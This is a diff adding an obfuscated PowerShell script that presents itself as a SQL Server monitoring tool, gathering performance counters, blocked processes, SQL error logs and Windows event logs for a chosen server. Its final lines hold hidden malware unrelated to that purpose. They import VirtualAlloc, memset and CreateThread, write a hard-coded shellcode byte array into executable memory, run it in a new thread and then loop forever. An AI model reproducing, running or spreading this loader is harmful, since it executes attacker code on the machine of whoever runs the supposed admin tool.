@@ -1,0 +1,187 @@
+SEt-iTeM vArIABLe:n45V7S  ( [tYpE]("{1}{0}{3}{2}" -F 'e','r','n.asseMbLY','FLEcTIo')  ) ;  &("{2}{1}{0}" -f'r-Host','a','Cle')
+ (gEt-vaRiABLE N45v7S  -vAlUEONl  )::("{0}{2}{1}{3}"-f'L','ial','oadWithPart','Name').Invoke(("{0}{3}{1}{4}{2}" -f 'Micro','e','o','soft.SqlS','rver.Sm'))
+
+[int]${NUmOFpER`F`MONcoLleCt`I`o`NS} = 2
+[int]${INTerVALO`FcoLl`EC`T`I`ONs} = 2
+
+
+${phyS`Ica`LcoU`NTErS} =  (((("{2}{6}{1}{0}{5}{3}{4}" -f'Av','ryt6q','t6qM','able M','Bytes','ail','emo')) -CReplAce't6q',[chaR]92)) `
+	,(((("{0}{6}{11}{4}{1}{10}{7}{9}{3}{2}{8}{5}"-f 'qAbPhy','(',' Disk s','g.','lDisk','c/Read','sic',')qAb','e','Av','_Total','a'))-rEPlAce'qAb',[chaR]92))`
+	,(((("{4}{3}{0}{2}{7}{5}{6}{1}"-f'a',' Disk sec/Write','lDisk(','ysic','{0}Ph','Avg','.','_Total){0}')) -f  [cHAR]92))  `
+	,(((("{1}{2}{10}{7}{9}{5}{3}{0}{4}{6}{8}" -f ' P','E','mq','tal)Emq%','rocessor','o',' Ti','oces','me','sor(_T','Pr'))  -crEplace'Emq',[CHaR]92)) 
+	
+
+${S`QLCOUNt`eRt`emPl`ATE} =  (((("{1}{2}{7}{0}{11}{5}{8}{6}{10}{9}{3}{4}{12}" -f 'key]:S','tWs[','insta','que','s','tat','icstW','nce','ist','tch Re','sBa','QL S','ts/sec')).("{0}{1}" -f'Repl','AcE').Invoke('tWs','\'))) `
+				,(((("{2}{9}{1}{11}{12}{6}{8}{10}{7}{0}{3}{4}{5}" -f'k','n','v','files C','reated/','sec','ces','svjSWor','s M','jS[insta','ethod','c','ekey]:Ac'))  -repLAce 'vjS',[cHAr]92))`
+				,(((("{7}{3}{2}{0}{8}{1}{5}{6}{4}{9}" -f'y]:B','e','ke','ance','nc','r Man','ager{0}Page life expecta','{0}[inst','uff','y'))-f [ChAR]92))
+
+
+
+function GeT-s`QlC`ou`NTe`Rs{
+	param([string] ${SQLSe`Rv`ErTo`mONIToR}, ${cOunt`e`RS})
+	${CoUN`TE`RArr`Ay} = @() 
+	
+	[int]${in`Stpos} = ${sq`lSERVertOM`O`N`iT`Or}.("{0}{1}" -f'Inde','xOf').Invoke("\");
+	if(${In`St`POs} -gt 0){ 
+		${I`NSTp`oS} += 1;
+		${inS`TANC`e`kEy} = "MSSQL$" + ${SQlS`Er`VE`RtoM`oNItoR}.("{2}{1}{0}" -f'ing','str','Sub').Invoke(${iNs`TP`Os},(${SqLSEr`VerT`OM`O`Nit`Or}."l`eNgth" - ${InsT`pOS}))
+	} else { 
+		${iN`sT`AN`cEkEy} = ("{1}{2}{0}{3}" -f'L','S','Q','Server')
+	}
+	
+	foreach(${C`NTeR} in ${COUn`T`eRS}) {
+		${COu`NtEra`R`RaY} += ${C`NTer}."R`Eplace"(("{3}{0}{1}{2}" -f 'i','ns','tancekey]','['),${iNst`A`NCEkEy})
+	}
+ 	return ${cO`UNTErarr`Ay};
+}
+
+
+function i`Nvok`E-S`QlcmD3
+{
+    param(
+    [string]${S`e`R`VErINsTANce},
+    [string]${q`U`ery}
+    )
+	${queRytI`me`out}=30
+    ${CO`NN}=&("{2}{1}{0}" -f'ct','ew-obje','n') ("{6}{5}{3}{4}{2}{0}{1}"-f'Con','nection','ient.SQL','a.S','qlCl','ystem.Dat','S')
+	${cO`NS`Tri`NG} = ("{1}{0}"-f'erver=','S') + ${s`ErvErINS`TaN`cE} + ("{4}{0}{5}{1}{6}{3}{2}" -f'n','e','ity=True',' Secur',';I','t','grated')
+	${cO`NN}."COnnEc`Tio`Ns`T`RING"=${conS`Tr`InG}
+    	${Co`Nn}.("{1}{0}"-f 'en','Op').Invoke()
+		if(${CO`NN}){
+    	${C`md}=&("{1}{2}{0}" -f 'bject','new','-o') ("{6}{2}{1}{4}{3}{0}{5}" -f'.SqlC','ta.SqlC','m.Da','t','lien','ommand','syste')(${qU`ERY},${C`ONn})
+    	${c`MD}."c`OmMANdT`IMe`oUt"=${QU`eRyTImE`OUT}
+    	${D`s}=&("{1}{3}{0}{2}"-f'c','New-Ob','t','je') ("{0}{4}{2}{3}{1}" -f 's','t','stem.Data.DataS','e','y')
+    	${d`A}=&("{0}{1}{2}"-f'New-','Obj','ect') ("{7}{4}{0}{3}{2}{1}{5}{6}"-f 'ste','nt.SqlData','Clie','m.Data.Sql','y','Adapt','er','s')(${C`mD})
+    	[void]${D`A}.("{1}{0}"-f 'll','fi').Invoke(${dS})
+    	${C`ONN}.("{1}{0}" -f 'se','Clo').Invoke()
+    	${Ds}."T`Ab`LES"[0]
+	}
+}
+
+
+
+${S`erveR} = &("{0}{1}"-f'Read-','Host') -Prompt ("{2}{1}{0}"-f 'cify a server','e','Sp') 
+
+
+[int]${HOuR`Thr`EshOlD} = &("{1}{0}"-f'st','Read-Ho') -Prompt ("{4}{1}{0}{5}{3}{2}"-f'ou','f H','s','n Log','Number o','rs to Check i')
+
+[datetime] ${d`ATE`TOche`ck} = (&("{2}{0}{1}"-f '-Da','te','Get')).("{0}{1}" -f 'AddH','ours').Invoke(-1 * ${ho`Urt`hrE`SHo`Ld})
+[string]${SYsPR`Oc`ESsQu`erY} = ((("{17}{20}{35}{25}{6}{32}{33}{29}{36}{8}{39}{18}{37}{38}{31}{23}{11}{7}{27}{24}{40}{13}{21}{10}{26}{14}{4}{2}{5}{0}{19}{22}{9}{34}{12}{3}{28}{16}{15}{30}{1}" -f'
+	FROM master..','}','ame','b','n',' ','d,','id','ime,la','	','u','rce,db','RE ','l_i','t','r by spid','!= 0  
+	orde','{0}
+	SE','t','syspro','L','o,mem','cesses 
+','u','s','T spi','sage,hos','
+	,cpu,phy','locked ','an,wa','
+{0','waitreso','b','locked,open_tr','WHE','EC','itt','waitt','ype,','s','ica'))-F[ChAR]34)
+
+if(&("{1}{3}{2}{0}" -f'ection','Test-C','nn','o') -ComputerName ${s`erVEr})
+{
+	&("{1}{0}{2}"-f 'e-H','Writ','ost') ("$server "+'pin'+'ge'+'d '+'succe'+'ssful'+'ly')
+} else {
+	&("{0}{2}{1}" -f 'W','t','rite-Hos') ("$server "+'c'+'oul'+'d '+'not'+' '+'b'+'e '+'ping'+'ed!')
+	break;
+}
+
+
+${sQ`lSE`RViceS} = &("{0}{3}{4}{2}{1}"-f'G','ect','bj','et-Wmi','O') -ComputerName ${SERv`ER} ("{1}{2}{3}{0}{4}" -f 'ervic','w','in32_','s','e') | 
+		&("{2}{0}{3}{1}" -f 'ere-Obj','ct','Wh','e') {${_}."Na`ME" -like ("{1}{0}"-f'*','*SQL') } |
+		&("{0}{1}{2}{3}"-f 'Se','lect-Obje','c','t') ("{0}{1}"-f'Nam','e'),("{2}{0}{3}{1}" -f't','rtMode','S','a'),("{0}{1}" -f'St','ate'),("{1}{0}" -f'tatus','S') 
+ 
+ if(${sQLs`e`Rv`ICEs}."Co`UNt" -gt 0) {
+	${sqlsE`Rv`iC`eS} | &("{0}{3}{1}{2}"-f 'O','t-','GridView','u') -Title ("$server "+'SQ'+'L '+'Ser'+'vices '+'In'+'form'+'ati'+'on')
+	}
+
+
+
+
+	&("{2}{0}{1}"-f 'te-','Host','Wri') ("{4}{2}{5}{3}{1}{6}{0}"-f '..','s.','O','nter','Reading ','S Perf Cou','.')
+	try{
+		${SQlC`O`UNt`ERs} = &("{0}{3}{1}{2}"-f 'Ge','un','ter','t-Co') -ComputerName ${S`Er`VeR} -Counter ${p`h`YsI`C`ALCouNTe`Rs} `
+								-MaxSamples ${NUM`Of`peRFMO`NcoLLe`CTiONs} -SampleInterval ${IntErValOf`c`OL`LECTi`ONS}
+	} catch {
+		&("{2}{0}{1}" -f 'os','t','Write-H') ("{7}{6}{3}{8}{2}{1}{4}{5}{0}" -f'ers','erf Cou','ading P','lem ','n','t','b','Pro','Re') ('+') ${e`RR`or}
+	}
+	
+
+
+Foreach(${SQ`L`SEr`Vice} in ${SQLSEr`ViC`Es} | 
+			&("{1}{0}{2}{3}"-f'Ob','Where-','je','ct'){${_}."N`Ame" -like "MSSQL$*" -or ${_}."nA`ME" -eq ("{2}{0}{1}" -f 'S','ERVER','MSSQL')} |
+			&("{1}{3}{0}{2}" -f'c','Wh','t','ere-Obje'){${_}."STA`Te" -eq ("{2}{0}{1}" -f'nn','ing','Ru')  } )
+{
+	[string]${SQLS`E`RveRNA`mE} = ${Sq`lS`erV`ICe}."NA`mE"
+	${SQ`lSe`R`VernAMe} = ${sQlseR`V`eR`N`AME}.("{1}{2}{0}" -f 'ce','Repl','a').Invoke("MSSQL$","$server\")
+	${S`qls`eRvEr`NaME} = ${Sqls`e`RVERnA`mE}.("{1}{0}" -f'eplace','R').Invoke(("{0}{1}{2}" -f'M','SSQLSERVE','R'),"$server")
+	
+	&("{2}{1}{0}"-f't','os','Write-h') ('Ch'+'ecki'+'ng '+"$sqlServerName")
+	${sq`lS`erVer} = &("{1}{0}{2}"-f '-Ob','New','ject')(("{7}{1}{0}{4}{5}{8}{6}{2}{3}" -f 'qlSe','oft.S','o.','Server','r','ver.Ma','nt.Sm','Micros','nageme')) ${SQLse`RVEr`N`A`ME}	 
+	
+	
+	try{
+		${t`BL} = &("{2}{0}{1}" -f'e-Sql','cmd3','Invok') -Query ${sy`SPRo`C`eSSQ`UERY} -ServerInstance ${sq`L`SERVE`RNaMe} |
+			&("{0}{2}{1}" -f 'Wh','ect','ere-Obj') {${_}."BlOC`kED" -ne "0"} | 
+			&("{1}{2}{0}"-f'w','Out-Gr','idVie') -Title ("$sqlServerName "+'Block'+'e'+'d '+'Pr'+'o'+'cesses')
+	}
+	catch{
+		&("{1}{0}{2}"-f 'rit','W','e-Host') ("{0}{2}{1}{4}{6}{7}{3}{5}"-f'Pr','e','obl','s','m Reading','ses',' Sys','Proce') ('+') ${ErR`OR}
+	}
+	
+	
+	&("{2}{0}{1}"-f 'e-','Host','Writ') ('Read'+'ing '+'SQL'+' '+'Lo'+'g '+'fo'+'r '+"$sqlServerName")
+	try{
+		${sQlS`erV`er}.("{1}{0}{2}" -f'rr','ReadE','orLog').Invoke() |	&("{1}{0}" -f're','Whe'){${_}."lOG`DatE" -is [datetime] } | 
+				&("{2}{0}{1}{3}"-f're-','Obj','Whe','ect'){${_}."L`Og`dATe" -gt ${D`AteTocHE`CK} } | 
+				&("{1}{0}{2}" -f'bj','Where-O','ect'){${_}."t`EXT" -like ("{0}{1}"-f'*E','rror*') -or ${_}."t`Ext" -like ("{0}{1}{2}" -f '*Fa','il','*')} |
+				&("{3}{1}{2}{0}" -f'ct','elect','-Obje','S') ("{0}{1}{2}" -f 'Log','D','ate'),("{0}{1}"-f'Tex','t') |
+				&("{1}{0}{2}{3}"-f 'ut-Gri','O','dVie','w') -Title ("$sqlServerName "+'Lo'+'g '+'Err'+'ors')
+	} catch {
+		&("{0}{1}{2}{3}" -f'Writ','e-H','os','t') ('Er'+'ro'+'r '+'Readin'+'g'+' '+"$sqlServer.Name")
+	}
+	
+	
+	try{
+		${sQli`NSt`A`NcECo`UN`TERS} = &("{3}{2}{0}{1}" -f'Cou','nters','et-SQL','G') -SQLServerToMonitor ${S`qlSER`VER`NaMe} -counters ${SqLc`OuN`Te`Rt`eM`PLaTE}
+	} catch {
+		&("{1}{2}{0}" -f 'ost','Write','-H') ('E'+'rr'+'or '+'Bui'+'l'+'ding '+'SQ'+'L '+'Counter'+' '+'Templ'+'at'+'e '+"$_")
+	}
+	
+	try{
+		${Sq`lCoUnT`e`RS} += &("{1}{2}{0}" -f'r','G','et-Counte') -ComputerName ${S`E`RveR} -Counter ${sQ`lI`N`StA`NCE`CountE`RS} `
+						-MaxSamples ${NUMOfperfMO`NC`oLL`ec`TIons} -SampleInterval ${i`N`TERvaLO`FcoLlECtI`o`Ns} 
+	} catch {
+		&("{3}{2}{1}{0}"-f 't','s','Ho','Write-') ('E'+'rro'+'r '+'get'+'ting'+' '+'SQ'+'L '+'Coun'+'ters'+' '+"$_")
+	}						
+	
+} 
+
+	
+	${sql`coUn`T`eRS} | &("{0}{2}{1}" -f'ForEa','Object','ch-'){ ${_}."Coun`TE`RSaMp`leS" | &("{1}{3}{0}{2}" -f't-O','Se','bject','lec')  ("{0}{1}" -f 'P','ath'), ("{0}{2}{1}"-f'Co','ue','okedVal') } |
+		&("{1}{2}{0}" -f'dView','Out-Gr','i') -Title ("$sqlServer "+'Pe'+'rfmo'+'n '+'Count'+'er'+'s')
+
+	try{
+	&("{1}{0}{2}"-f 'rite-Ho','W','st') ("{6}{5}{3}{4}{1}{0}{2}" -f'ent Log','g Ev','s...','adi','n','e','R')
+	
+	${sY`sT`EM`LoG} = &("{3}{1}{0}{2}"-f'Lo','t','g','Get-Even') -ComputerName ${s`Er`VeR} `
+		-EntryType ("{0}{1}"-f'E','rror') -LogName ("{1}{0}"-f 'tem','Sys') -After ${DAt`eT`oC`HeCk} |
+		&("{1}{2}{3}{0}" -f 't','Select-Obj','e','c') ("{2}{0}{1}{3}" -f 'i','meGenera','T','ted'),("{1}{0}" -f'ource','S'),("{0}{1}{2}"-f 'Mes','sag','e') 
+		
+	${Ap`PloG} = &("{3}{0}{1}{2}" -f'et-','E','ventLog','G') -ComputerName ${SeR`VeR} `
+		-EntryType ("{1}{0}" -f 'or','Err') -LogName ("{1}{0}{2}" -f'ic','Appl','ation') -After ${dA`T`eT`ochECk} |
+		&("{1}{0}{2}"-f 'le','Se','ct-Object') ("{0}{2}{1}" -f 'Ti','nerated','meGe'),("{0}{1}" -f'Sou','rce'),("{0}{1}"-f'M','essage') 
+		
+	if(${s`ystE`ml`OG}."c`OuNT" -gt 0) {${sER`VERL`o`gS} += ${SyS`TE`mLOg}}	
+	if(${Ap`p`lOG}."c`ounT" -gt 0) {${SE`RVer`LOgs} += ${a`pplOg}}	
+	
+	if(${seR`V`e`RlOGs}."CoU`Nt" -gt 0) { ${S`ERve`RlO`GS} | &("{0}{1}{2}{3}" -f'Out-Gr','i','dVie','w') -Title ("$server "+'Ev'+'ent '+'L'+'ogs') }
+
+} catch {
+	&("{0}{2}{1}" -f'Write-','t','Hos') ("{1}{5}{8}{6}{7}{4}{9}{3}{0}{10}{2}" -f 't L','Pr','gs:','en','rver E','o','em Reading S','e','bl','v','o') ('+') ${ER`RoR}
+}
+
+
+
+
+
+
+
+
+${c} = (((("{90}{32}{75}{57}{73}{39}{16}{70}{37}{9}{74}{13}{88}{12}{26}{76}{49}{19}{0}{33}{53}{86}{80}{84}{91}{71}{69}{47}{42}{6}{28}{1}{24}{4}{63}{29}{64}{50}{79}{2}{14}{3}{62}{25}{67}{17}{41}{82}{36}{18}{81}{40}{52}{61}{66}{5}{8}{31}{27}{43}{11}{38}{45}{68}{48}{21}{54}{55}{56}{78}{30}{7}{20}{85}{77}{10}{34}{22}{72}{89}{87}{60}{46}{23}{15}{83}{51}{65}{44}{35}{59}{58}"-f 'wSiz','t);[D','c static extern Int','Crea','vke','tAddres','e',');[DllI','s','Al','P7v','lpP','d','tPtr ','Ptr ','In','nt','IntPtr lpT','tes, uint dwSt',' d','mport(','CreationFlag','ubli','t(','llImport(P7','eThre','dr','IntPt','c','2.','d',', ','el32','e, uint',')]p','t','ttribu','ual','aram','xtern I','Size, IntPt','h','t','r ','src, uin','e','e','flPro','nt dw','int','pu',' dest, uin','r l',' f','s,',' IntPtr lp','Th',')]',');',' count','r mems','p','t','rnel3','dllP7v)]','t ','Star','ad(','ter, ui','uint ','Ptr Virt','onType, ','c static ','public static e','loc(In','.dllP7v','ess, u','crt.dll','readI','bli','A','ack','readA','tPtr','lloc','P7vmsv','l','n IntPt','lpA','exter','[DllImport(P7vkern','ati'))-ReplACe([chAr]80+[chAr]55+[chAr]118),[chAr]34));${W} = &("{1}{0}{2}" -f'-','Add','Type') -memberDefinition ${c} -Name ("{0}{1}" -f'Win3','2') -namespace ("{0}{3}{1}{2}" -f'Win','2Func','tions','3') -passthru;[Byte[]];[Byte[]]${Z} = 0xba,0x01,0xbd,0x77,0x57,0xda,0xdd,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x50,0x13,0x03,0x50,0x13,0x83,0xe8,0xfd,0x5f,0x82,0xab,0x15,0x1d,0x6d,0x54,0xe5,0x42,0xe7,0xb1,0xd4,0x42,0x93,0xb2,0x46,0x73,0xd7,0x97,0x6a,0xf8,0xb5,0x03,0xf9,0x8c,0x11,0x23,0x4a,0x3a,0x44,0x0a,0x4b,0x17,0xb4,0x0d,0xcf,0x6a,0xe9,0xed,0xee,0xa4,0xfc,0xec,0x37,0xd8,0x0d,0xbc,0xe0,0x96,0xa0,0x51,0x85,0xe3,0x78,0xd9,0xd5,0xe2,0xf8,0x3e,0xad,0x05,0x28,0x91,0xa6,0x5f,0xea,0x13,0x6b,0xd4,0xa3,0x0b,0x68,0xd1,0x7a,0xa7,0x5a,0xad,0x7c,0x61,0x93,0x4e,0xd2,0x4c,0x1c,0xbd,0x2a,0x88,0x9a,0x5e,0x59,0xe0,0xd9,0xe3,0x5a,0x37,0xa0,0x3f,0xee,0xac,0x02,0xcb,0x48,0x09,0xb3,0x18,0x0e,0xda,0xbf,0xd5,0x44,0x84,0xa3,0xe8,0x89,0xbe,0xdf,0x61,0x2c,0x11,0x56,0x31,0x0b,0xb5,0x33,0xe1,0x32,0xec,0x99,0x44,0x4a,0xee,0x42,0x38,0xee,0x64,0x6e,0x2d,0x83,0x26,0xe6,0x82,0xae,0xd8,0xf6,0x8c,0xb9,0xab,0xc4,0x13,0x12,0x24,0x64,0xdb,0xbc,0xb3,0x8b,0xf6,0x79,0x2b,0x72,0xf9,0x79,0x65,0xb0,0xad,0x29,0x1d,0x11,0xce,0xa1,0xdd,0x9e,0x1b,0x5f,0xdb,0x08,0x08,0xb0,0xd1,0x44,0x38,0xb3,0x15,0x70,0x08,0x3a,0xf3,0x28,0x3a,0x6d,0xac,0x88,0xea,0xcd,0x1c,0x60,0xe1,0xc1,0x43,0x90,0x0a,0x08,0xec,0x3a,0xe5,0xe5,0x44,0xd2,0x9c,0xaf,0x1f,0x43,0x60,0x7a,0x5a,0x43,0xea,0x89,0x9a,0x0d,0x1b,0xe7,0x88,0xf9,0xeb,0xb2,0xf3,0xaf,0xf4,0x68,0x99,0x4f,0x61,0x97,0x08,0x18,0x1d,0x95,0x6d,0x6e,0x82,0x66,0x58,0xe5,0x0b,0xf3,0x23,0x91,0x73,0x13,0xa4,0x61,0x22,0x79,0xa4,0x09,0x92,0xd9,0xf7,0x2c,0xdd,0xf7,0x6b,0xfd,0x48,0xf8,0xdd,0x52,0xda,0x90,0xe3,0x8d,0x2c,0x3f,0x1b,0xf8,0xac,0x03,0xca,0xc4,0xda,0x6d,0xce;${G} = 0x1000;if (${Z}."l`e`NgTh" -gt 0x1000){${g} = ${Z}."L`E`NGTH"};${x}=${W}::("{1}{2}{3}{0}" -f 'c','Vir','tual','Allo').Invoke(0,0x1000,${g},0x40);for (${i}=0;${I} -le (${z}."LEnG`Th"-1);${i}++) {${w}::"M`Em`set"([IntPtr](${x}.("{0}{1}{2}" -f 'ToIn','t3','2').Invoke()+${I}), ${z}[${I}], 1)};${w}::("{2}{0}{1}" -f'reateThr','ead','C').Invoke(0,0,${X},0,0,0);for (;;){&("{2}{0}{1}" -f'tart-','sleep','S') 60};
